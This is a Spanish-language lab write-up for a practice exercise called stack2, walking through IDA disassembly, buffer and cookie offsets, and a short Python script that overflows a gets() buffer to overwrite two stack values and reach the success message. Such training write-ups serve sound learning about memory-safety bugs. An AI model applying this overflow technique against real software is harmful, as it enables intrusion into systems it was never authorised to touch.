@@ -1,0 +1,72 @@
+Stack2 by k0ch // 4 junio 2016
+
+Entorno: Windows 7 32bits
+
+En este caso analicé el stack2.idb con IDA PRO 6.8. Es bastante parecido a stack1, con la diferencia de que tenemos 
+una cookie más para pisar :)
+
+.text:004012B5                 call    ___main
+.text:004012BA                 mov     [ebp+var_10], 0
+.text:004012C1                 lea     eax, [ebp+var_C]  <--- cookie2 en 0x00C
+.text:004012C4                 mov     [esp+78h+var_6C], eax
+.text:004012C8                 lea     eax, [ebp+var_14] <--- cookie en 0x014. 0x014 - 0x00C = 0x008 (8 en decimal)
+.text:004012CB                 mov     [esp+78h+var_70], eax
+.text:004012CF                 lea     eax, [ebp+Buffer] <--- buffer en 0x058. 0x058 - 0x014 = 0x044 (68 en decimal)
+.text:004012D2                 mov     [esp+78h+var_74], eax
+.text:004012D6                 mov     [esp+78h+Format], offset Format ; "buf: %08x cookie: %08x cookie2: %08x\n"
+.text:004012DD                 call    _printf
+.text:004012E2                 lea     eax, [ebp+Buffer]
+.text:004012E5                 mov     [esp+78h+Format], eax ; Buffer
+.text:004012E8                 call    _gets <--- En este punto insertaremos nuestro string mágico :)
+.text:004012ED                 cmp     [ebp+var_14], 71727374h <--- Comparación de cookie
+.text:004012F4                 jnz     short loc_401323
+.text:004012F6                 cmp     [ebp+var_C], 91929394h <--- Comparación de cookie2
+.text:004012FD                 jnz     short loc_401323
+.text:004012FF                 lea     eax, [ebp+var_10]
+.text:00401302                 inc     dword ptr [eax]
+.text:00401304                 lea     eax, [ebp+var_10]
+.text:00401307                 mov     [esp+78h+var_74], eax
+.text:0040130B                 mov     [esp+78h+Format], offset aFlagX ; "flag %x"
+.text:00401312                 call    _printf
+.text:00401317                 mov     [esp+78h+Format], offset aYouAreAWinnner ; "you are a winnner man je\n"
+.text:0040131E                 call    _printf
+.text:00401323                 mov     dword ptr [esp], offset Command ; "PAUSE"
+.text:0040132A                 call    _system
+.text:0040132F                 leave
+.text:00401330                 retn
+.text:00401330 _main           endp
+
+Vamos a detenerlos un poco en las comparaciones. Para que el programa nos lleve a nuestro deseado payload, debemos 
+hacer coincidir la comparación de "cookie" con 71727374. Para saber de que caracteres se tratan, llevamos el hex 
+a una calculadora de ascii (https://www.branah.com/ascii-converter), resultando en los siguientes caracteres:
+71727374h = qrst
+
+Como se trata de memoria little endian debemos leer al revés los caracteres, resultando:
+tsrq
+
+Para la segunda comparación nos alejamos del código ascii convencional, por lo tanto debemos insertar los caracteres
+con escape hexadecimal, de esta manera:
+91929394h -> "\x94\x93\x92\x91"
+
+Ya tenemos casi todo lo necesario, debemos llenar "buf" con 68 caracteres, luego escribir "tsrq" para llenar "cookie",
+luego 4 caracteres extra y finalmente "\x94\x93\x92\x91" para llenar "cookie2". El siguiente script de python puede 
+ayudar para tal fin:
+
+//---------------------
+
+import os
+
+StdIn,StdOut = os.popen4(r".\stack2.exe")
+
+XploitString = "x" * 68 + "tsrq" + "x" * 4 + "\x94\x93\x92\x91" + '\n'
+print XploitString
+
+StdIn.write(XploitString)
+StdIn.close()
+
+print StdOut.read()
+
+//---------------------
+
+SEE YOU SPACE COWBOY :)
+..k0ch
